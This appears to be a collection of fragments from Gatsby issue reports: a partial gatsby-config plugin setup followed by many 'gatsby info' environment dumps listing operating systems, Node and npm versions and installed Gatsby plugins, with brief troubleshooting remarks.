process.env.gatsby_aws_secret_access_key, region: process.env.gatsby_aws_region, bucketname: process.env.gatsby_assets_bucket_name, publicdomain: process.env.gatsby_assets_bucket_name, protocol: 'https', prefix: 'common', nodetype: 'assets', }, }, { resolve: 'gatsby-plugin-s3', options: { bucketname: 'staging.domain.com', protocol: 'https', hostname: 'staging.domain.fr', }, }, { resolve: 'gatsby-plugin-remote-images', options: { nodetype: 'assets', imagepath: 'url', prepareurl: (url) => encodeuri(url), }, }, 'gatsby-transformer-sharp', 'gatsby-plugin-sharp', { resolve: 'gatsby-plugin-manifest', options: { name: 'name', short_name: 'short_name', start_url: '/', background_color: '#252733', theme_color: '#29c5a9', display: 'minimal-ui', icon: 'src/images/icon.png', // this path is relative to the root of the site
not possbile to run gatsby info ##extra i ran also a yarn cache clean
node v10.21.0
npm v6.14.4
mac pro 16-inch
system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i5-8250u cpu @ 1.60ghz binaries: node: 12.18.2 - c:\\program files\ odejs\ ode.exe yarn: 1.22.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.5 - /c/users/vicradon/appdata/local/programs/python/python38/python browsers: chrome: 84.0.4147.105 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.20.12 => 2.24.23 gatsby-plugin-manifest: ^2.3.3 => 2.4.21 gatsby-plugin-offline: ^3.1.2 => 3.2.21 gatsby-plugin-react-helmet: ^3.2.1 => 3.3.10 gatsby-plugin-sass: ^2.2.1 => 2.3.12
system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - ~/.nvm/versions/node/v14.5.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.5.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 78.0.2 safari: 13.1.2 npmpackages: gatsby: ^2.20.35 => 2.24.23 gatsby-image: ^2.3.5 => 2.4.14 gatsby-plugin-netlify: ^2.2.4 => 2.3.11 gatsby-plugin-netlify-cms: ^4.2.5 => 4.3.11 gatsby-plugin-purgecss: ^5.0.0 => 5.0.0 gatsby-plugin-react-helmet: ^3.2.5 => 3.3.10 gatsby-plugin-sass: ^2.2.4 => 2.3.12 gatsby-plugin-sharp: ^2.5.7 => 2.6.24 gatsby-remark-copy-linked-files: ^2.2.4 => 2.3.12 gatsby-remark-images: ^3.2.6 => 3.3.23 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.2.5 => 2.3.23 gatsby-transformer-remark: ^2.7.5 => 2.8.27 gatsby-transformer-sharp: ^2.4.7 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.60
system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.11.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 78.0.2 safari: 13.1.2 npmpackages: gatsby: 2.24.11 => 2.24.11 gatsby-plugin-mdx: 1.2.29 => 1.2.29 gatsby-plugin-react-svg: 3.0.0 => 3.0.0 gatsby-plugin-sass: 2.3.12 => 2.3.12 gatsby-plugin-sharp: 2.6.22 => 2.6.22 gatsby-plugin-styled-components: 3.3.10 => 3.3.10 gatsby-plugin-typescript: 2.4.16 => 2.4.16 gatsby-remark-dropcap: 0.1.2 => 0.1.2 gatsby-remark-images: 3.3.21 => 3.3.21 gatsby-remark-katex: 3.3.10 => 3.3.10 gatsby-source-filesystem: 2.3.23 => 2.3.23 gatsby-transformer-remark: 2.8.27 => 2.8.27
``` system: os: macos 10.15.6 cpu: (24) x64 amd ryzen 9 3900x 12-core processor shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 edge: 84.0.522.52 firefox: 78.0.1 safari: 13.1.2 npmpackages: gatsby: ^2.24.26 => 2.24.27 gatsby-image: ^2.0.20 => 2.4.14 gatsby-plugin-catch-links: ^2.0.9 => 2.3.11 gatsby-plugin-feed: ^2.0.11 => 2.5.11 gatsby-plugin-google-analytics: ^2.0.8 => 2.3.13 gatsby-plugin-manifest: ^2.0.11 => 2.4.21 gatsby-plugin-offline: ^2.0.16 => 2.2.10 gatsby-plugin-preact: ^4.0.9 => 4.0.9 gatsby-plugin-react-helmet: ^3.0.4 => 3.3.10 gatsby-plugin-sharp: ^2.0.32 => 2.6.24 gatsby-remark-copy-linked-files: ^2.0.7 => 2.3.12 gatsby-remark-images: ^3.0.1 => 3.3.24 gatsby-source-filesystem: ^2.0.28 => 2.3.23 gatsby-transformer-json: ^2.1.6 => 2.4.11 gatsby-transformer-remark: ^2.1.15 => 2.8.27 gatsby-transformer-sharp: ^2.1.8 => 2.5.12 //added manually @forestryio/gatsby-remark-normalize-paths: ^1.0.0 preact: ^10.4.6 preact-render-to-string: ^5.1.10 react-helmet: 5.2.0 npmglobalpackages: gatsby-cli: 2.12.61
``` system: os: macos 10.15.6 cpu: (6) x64 intel(r) core(tm) i5-8500b cpu @ 3.00ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 84.0.4147.105 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.26 => 2.24.26 gatsby-image: ^2.4.14 => 2.4.14 gatsby-plugin-feed: ^2.5.11 => 2.5.11 gatsby-plugin-google-analytics: ^2.3.13 => 2.3.13 gatsby-plugin-manifest: ^2.4.21 => 2.4.21 gatsby-plugin-offline: ^3.2.21 => 3.2.21 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.24 => 2.6.24 gatsby-plugin-typography: ^2.5.10 => 2.5.10 gatsby-remark-copy-linked-files: ^2.3.12 => 2.3.12 gatsby-remark-images: ^3.3.24 => 3.3.24 gatsby-remark-prismjs: ^3.5.10 => 3.5.10 gatsby-remark-responsive-iframe: ^2.4.12 => 2.4.12 gatsby-remark-smartypants: ^2.3.10 => 2.3.10 gatsby-source-filesystem: ^2.3.23 => 2.3.23 gatsby-transformer-remark: ^2.8.27 => 2.8.27 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.66
system: os: windows 10 10.0.18363 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz binaries: node: 12.14.0 - c:\\program files\ odejs\ ode.exe npm: 6.13.6 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sass: ^2.3.12 => 2.3.12 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-remark-classes: ^1.0.0 => 1.0.0 gatsby-remark-images: ^3.3.23 => 3.3.23 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-source-mysql: ^2.2.3 => 2.2.3 gatsby-transformer-remark: ^2.8.27 => 2.8.27 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.49
system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.2 - ~/.nvm/versions/node/v12.16.2/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.16.2/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.2/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 72.0.1 safari: 13.1.2 npmpackages: gatsby: 2.24.9 => 2.24.9 gatsby-image: ^2.4.13 => 2.4.13 gatsby-plugin-postcss: ^2.3.11 => 2.3.11 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.6.22 => 2.6.22 gatsby-source-filesystem: ^2.3.7 => 2.3.22 gatsby-source-wordpress-experimental: 1.0.7 => 1.0.7 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 gatsby-wordpress-experimental-inline-images: ^0.0.3 => 0.0.3 npmglobalpackages: gatsby-cli: 2.12.63
**note- i reverted to gatsby-cli@2.12.68 and it works fine again** system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-4720hq cpu @ 2.60ghz shell: 4.4.20 - /bin/bash binaries: node: 12.18.3 - /usr/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.6 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 79.0 npmpackages: gatsby: ^2.23.3 => 2.24.25 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.4.7 => 2.4.14 gatsby-plugin-manifest: ^2.4.11 => 2.4.21 gatsby-plugin-offline: ^3.2.9 => 3.2.21 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.10 gatsby-plugin-sharp: ^2.6.12 => 2.6.24 gatsby-plugin-styled-components: ^3.3.4 => 3.3.10 gatsby-source-filesystem: ^2.3.12 => 2.3.23 gatsby-transformer-remark: ^2.8.17 => 2.8.27 gatsby-transformer-sharp: ^2.5.5 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.68
system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.17.0 - ~/.nvm/versions/node/v12.17.0/bin/node npm: 6.14.7 - ~/.nvm/versions/node/v12.17.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 safari: 13.1.2 npmpackages: gatsby: ^2.24.4 => 2.24.4 gatsby-image: ^2.4.13 => 2.4.13 gatsby-plugin-catch-links: ^2.3.11 => 2.3.11 gatsby-plugin-feed-mdx: ^1.0.1 => 1.0.1 gatsby-plugin-google-analytics: ^2.3.11 => 2.3.11 gatsby-plugin-manifest: ^2.4.18 => 2.4.21 gatsby-plugin-mdx: ^1.2.27 => 1.2.27 gatsby-plugin-offline: ^3.2.18 => 3.2.18 gatsby-plugin-preact: ^4.0.9 => 4.0.9 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-s3: ^0.3.3 => 0.3.4 gatsby-plugin-sharp: ^2.6.19 => 2.6.22 gatsby-plugin-sitemap: ^2.4.11 => 2.4.11 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-remark-attr: ^0.1.0 => 0.1.0 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.3.19 => 3.3.19 gatsby-remark-unwrap-images: ^1.0.2 => 1.0.2 gatsby-source-filesystem: ^2.3.20 => 2.3.23 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.66
``` system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (4) x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz shell: 5.8 - /usr/bin/zsh binaries: node: 14.6.0 - /usr/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.6 - /usr/bin/npm browsers: chrome: 84.0.4147.105 firefox: 79.0 npmpackages: gatsby: 2.24.23 => 2.24.23 gatsby-image: 2.4.14 => 2.4.14 gatsby-plugin-linaria: 2.1.0 => 2.1.0 gatsby-plugin-manifest: 2.4.21 => 2.4.21 gatsby-plugin-postcss: 2.3.11 => 2.3.11 gatsby-plugin-purgecss: 5.0.0 => 5.0.0 gatsby-plugin-react-helmet: 3.3.10 => 3.3.10 gatsby-plugin-root-import: 2.0.5 => 2.0.5 gatsby-plugin-sharp: 2.6.24 => 2.6.24 gatsby-plugin-typescript: 2.4.16 => 2.4.16 gatsby-source-filesystem: 2.3.23 => 2.3.23 gatsby-source-multi-api: 1.0.5 => 1.0.5 gatsby-transformer-sharp: 2.5.12 => 2.5.12
``` upd: added note on graphiql
``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 14.7.0 - ~/.nvm/versions/node/v14.7.0/bin/node yarn: 1.21.0 - /usr/local/bin/yarn npm: 6.14.7 - ~/.nvm/versions/node/v14.7.0/bin/npm languages: python: 3.7.8 - /usr/local/opt/python/libexec/bin/python browsers: safari: 13.1.1
``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 14.7.0 - ~/.nvm/versions/node/v14.7.0/bin/node yarn: 1.21.0 - /usr/local/bin/yarn npm: 6.14.7 - ~/.nvm/versions/node/v14.7.0/bin/npm languages: python: 3.7.8 - /usr/local/opt/python/libexec/bin/python browsers: chrome: 84.0.4147.105
```bash system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 edge: 84.0.522.49 firefox: 78.0.2 safari: 13.1 npmpackages: gatsby: ^2.24.23 => 2.24.23 gatsby-cli: ^2.12.68 => 2.12.68 gatsby-image: ^2.4.14 => 2.4.14 gatsby-plugin-manifest: ^2.4.21 => 2.4.21 gatsby-plugin-offline: ^3.2.21 => 3.2.21 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.10 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sass: ^2.3.1 => 2.3.12 gatsby-plugin-sharp: ^2.6.24 => 2.6.24 gatsby-source-filesystem: ^2.3.23 => 2.3.23 gatsby-source-mongodb: ^2.3.6 => 2.3.10 gatsby-transformer-json: ^2.4.1 => 2.4.11 gatsby-transformer-sharp: ^2.5.12 => 2.5.12 npmglobalpackages: gatsby-cli: 2.6.5
gatsby v2 system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-3210m cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 13.7.0 - /usr/local/bin/node npm: 6.14.5 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: safari: 13.1.2 npmpackages: gatsby: ^2.22.15 => 2.22.15 gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-firebase: ^0.2.0-beta.4 => 0.2.0-beta.4 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-modal-routing: ^1.1.0 => 1.1.0 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-postcss: ^2.3.3 => 2.3.3 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-plugin-styled-components: ^3.3.3 => 3.3.3 gatsby-source-apiserver: ^2.0.0 => 2.0.0 gatsby-source-filesystem: ^2.3.12 => 2.3.12 gatsby-transformer-remark: ^2.8.17 => 2.8.17 gatsby-transformer-sharp: ^2.5.3 => 2.5.3 npmglobalpackages: gatsby-cli: 2.12.58
as well as the below this is also run on windows and a ci server on circle ci and all have the same thing system: os: linux 4.14 amazon linux ami 2018.03 cpu: (2) x64 intel(r) xeon(r) platinum 8175m cpu @ 2.50ghz shell: 4.2.46 - /bin/bash binaries: node: 10.21.0 - ~/.nvm/versions/node/v10.21.0/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v10.21.0/bin/npm languages: python: 3.6.11 - /usr/bin/python npmpackages: gatsby: ^2.24.14 => 2.24.14 gatsby-image: ^2.4.14 => 2.4.14 gatsby-link: ^2.2.20 => 2.4.13 gatsby-plugin-catch-links: ^2.1.13 => 2.3.11 gatsby-plugin-google-analytics: ^2.1.21 => 2.3.13 gatsby-plugin-react-helmet: ^3.1.11 => 3.3.10 gatsby-plugin-sass: ^2.1.18 => 2.3.12 gatsby-plugin-sharp: ^2.6.23 => 2.6.23 gatsby-plugin-sitemap: ^2.2.17 => 2.4.11 gatsby-remark-images: ^3.3.22 => 3.3.22 gatsby-remark-images-contentful: ^2.3.12 => 2.3.12 gatsby-source-contentful: ^2.3.33 => 2.3.33 gatsby-source-filesystem: ^2.3.23 => 2.3.23 gatsby-transformer-remark: ^2.8.27 => 2.8.27 gatsby-transformer-sharp: ^2.2.21 => 2.5.11
irrelevant, because again it just doesn't feel sustainable to have to waste maintainer time debugging my personal variation of this issue.
system: os: windows 10 10.0.18363 cpu: (4) x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz binaries: node: 12.18.3 - c:\\program files\ odejs\ ode.exe npm: 6.14.6 - c:\\program files\ odejs\ pm.cmd browsers: chrome: 84.0.4147.105 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-source-shopify: ^3.2.25 => 3.2.25 npmglobalpackages: gatsby-cli: 2.12.67
system: os: macos 10.15.5 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.12.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.2 safari: 13.1.1 npmpackages: gatsby: ^2.23.12 => 2.24.13 gatsby-image: ^2.4.9 => 2.4.14 gatsby-plugin-manifest: ^2.4.14 => 2.4.21 gatsby-plugin-offline: ^3.2.13 => 3.2.21 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.10 gatsby-plugin-sharp: ^2.6.14 => 2.6.23 gatsby-source-filesystem: ^2.3.14 => 2.3.23 gatsby-transformer-sharp: ^2.5.7 => 2.5.11
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.6.0 - /usr/local/bin/node npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: firefox: 78.0.2 safari: 13.1.1 npmpackages: gatsby: ^2.22.4 => 2.24.9 gatsby-image: ^2.4.5 => 2.4.13 gatsby-plugin-catch-links: ^2.3.2 => 2.3.11 gatsby-plugin-emotion: ^4.3.2 => 4.3.10 gatsby-plugin-feed-mdx: ^1.0.1 => 1.0.1 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.13 gatsby-plugin-google-tagmanager: ^2.3.3 => 2.3.11 gatsby-plugin-manifest: ^2.4.8 => 2.4.21 gatsby-plugin-mdx: ^1.2.25 => 1.2.25 gatsby-plugin-offline: ^3.2.7 => 3.2.21 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.10 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sharp: ^2.6.8 => 2.6.23 gatsby-plugin-sitemap: ^2.4.3 => 2.4.11 gatsby-remark-copy-linked-files: ^2.3.11 => 2.3.12 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.3.7 => 3.3.22 gatsby-remark-prismjs: ^3.5.2 => 3.5.10 gatsby-remark-reading-time: ^1.1.0 => 1.1.0 gatsby-remark-smartypants: ^2.3.2 => 2.3.10 gatsby-source-filesystem: ^2.3.7 => 2.3.23 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.67
system: os: linux 5.3 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz shell: 4.4.20 - /bin/bash binaries: node: 12.18.1 - /usr/bin/node npm: 6.9.0 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: firefox: 72.0.2 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-remark-prismjs: ^3.5.10 => 3.5.10 gatsby-source-filesystem: ^2.3.23 => 2.3.23 gatsby-transformer-remark: ^2.8.27 => 2.8.27 npmglobalpackages: gatsby-cli: 2.12.67
system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz binaries: node: 12.18.0 - c:\\program files\ odejs\ ode.exe npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.7.6 - /c/users/nosse1/appdata/local/programs/python/python37-32/python browsers: chrome: 84.0.4147.89 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-offline: ^3.2.13 => 3.2.13 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.66
```txt system: os: linux 4.19 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 4.4.12 - /bin/bash binaries: node: 12.18.3 - /usr/local/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-source-sanity: ^6.0.3 => 6.0.3
``` system: os: macos high sierra 10.13.6 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node npm: 6.14.7 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 72.0.2 safari: 11.1.2 npmpackages: gatsby: ^2.24.11 => 2.24.11 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-sass: ^2.3.1 => 2.3.1 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-plugin-typography: ^2.5.0 => 2.5.0 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-transformer-sharp: ^2.5.0 => 2.5.0 npmglobalpackages: gatsby-cli: 2.8.29
``` system: os: macos 10.15.2 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.3 - ~/.nvm/versions/node/v10.16.3/bin/node yarn: 1.22.4 - ~/.yarn/bin/yarn npm: 6.9.0 - ~/.nvm/versions/node/v10.16.3/bin/npm languages: python: 2.7.14 - /library/frameworks/python.framework/versions/2.7/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.2 safari: 13.0.4 npmglobalpackages: gatsby-cli: 2.12.43
system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 11.13.0 - ~/.nvm/versions/node/v11.13.0/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v11.13.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: safari: 12.1.2 npmpackages: gatsby: ^2.2.2 => 2.24.11 gatsby-image: ^2.0.34 => 2.4.13 gatsby-plugin-manifest: ^2.0.24 => 2.4.21 gatsby-plugin-offline: ^2.0.25 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.10 => 3.3.10 gatsby-plugin-sass: ^2.0.11 => 2.3.12 gatsby-plugin-sharp: ^2.0.29 => 2.6.22 gatsby-source-filesystem: ^2.0.27 => 2.3.23 gatsby-transformer-react-docgen: ^5.0.0 => 5.2.11 gatsby-transformer-remark: ^2.8.3 => 2.8.27 gatsby-transformer-sharp: ^2.1.17 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.66
``` system: os: macos 10.15.5 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.4.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.89 firefox: 78.0.2 safari: 13.1.1 npmpackages: gatsby: ^2.23.18 => 2.23.3 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.3.1 => 2.4.13 gatsby-plugin-create-client-paths: ^2.2.1 => 2.3.10 gatsby-plugin-manifest: ^2.3.3 => 2.4.20 gatsby-plugin-netlify-identity: 0.0.3 => 0.0.3 gatsby-plugin-offline: ^3.1.2 => 3.2.20 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.2.1 => 3.3.10 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sharp: ^2.5.3 => 2.6.21 gatsby-plugin-sitemap: ^2.4.3 => 2.4.11 gatsby-plugin-transition-link: ^1.18.0 => 1.20.2 gatsby-remark-responsive-iframe: ^2.3.3 => 2.4.11 gatsby-source-contentful: ^2.3.32 => 2.3.32 gatsby-source-filesystem: ^2.2.2 => 2.3.22 gatsby-source-stripe: ^3.0.7 => 3.1.1 gatsby-transformer-remark: ^2.7.3 => 2.8.26 gatsby-transformer-sharp: ^2.4.3 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.66
``` system: os: windows 10 10.0.18363 cpu: (4) x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz binaries: node: 12.13.0 - c:\\program files\ odejs\ ode.exe yarn: 1.21.1 - ~\\scoop\\apps\\yarn\\current\\yarn\\bin\\yarn.cmd npm: 6.12.0 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.18 => 2.24.11 gatsby-image: ^2.4.12 => 2.4.13 gatsby-plugin-emotion: ^4.3.9 => 4.3.10 gatsby-plugin-manifest: ^2.4.17 => 2.4.21 gatsby-plugin-netlify: ^2.3.10 => 2.3.11 gatsby-plugin-offline: ^3.2.16 => 3.2.21 gatsby-plugin-react-helmet: ^3.3.9 => 3.3.10 gatsby-plugin-sharp: ^2.6.17 => 2.6.22 gatsby-remark-prismjs: ^3.5.9 => 3.5.10 gatsby-remark-reading-time: ^1.1.0 => 1.1.0 gatsby-source-filesystem: ^2.3.18 => 2.3.23 gatsby-transformer-remark: ^2.8.23 => 2.8.27 gatsby-transformer-sharp: ^2.5.10 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.60
local environment info below
note that the problem also occurs when served through gitlab, as shown in the example above
``` system: os: linux 5.4 ubuntu 20.04 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz shell: 5.0.17 - /bin/bash binaries: node: 12.18.1 - ~/.nvm/versions/node/v12.18.1/bin/node npm: 6.14.5 - ~/.nvm/versions/node/v12.18.1/bin/npm browsers: chrome: 84.0.4147.89 firefox: 78.0.2 npmpackages: gatsby: ^2.23.12 => 2.23.12 gatsby-image: ^2.4.13 => 2.4.13 gatsby-plugin-sharp: ^2.6.22 => 2.6.22 gatsby-source-filesystem: ^2.3.23 => 2.3.23 gatsby-transformer-sharp: ^2.5.11 => 2.5.11 npmglobalpackages: gatsby-cli: 2.12.66
gatsbyjs.org website ### credits reported by @kaknut in:
- #25919 `look's like the image is missing`
system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i7-8550u cpu @ 1.80ghz binaries: node: 14.4.0 - c:\\program files\ odejs\ ode.exe yarn: 1.22.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.5 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.15 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.23.18 => 2.24.0 gatsby-image: ^2.4.12 => 2.4.12 gatsby-plugin-material-ui: ^2.1.9 => 2.1.9 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-sharp: ^2.6.17 => 2.6.17 gatsby-source-filesystem: ^2.3.18 => 2.3.18 gatsby-source-rest-api: ^0.2.3 => 0.2.3 gatsby-transformer-sharp: ^2.5.10 => 2.5.10
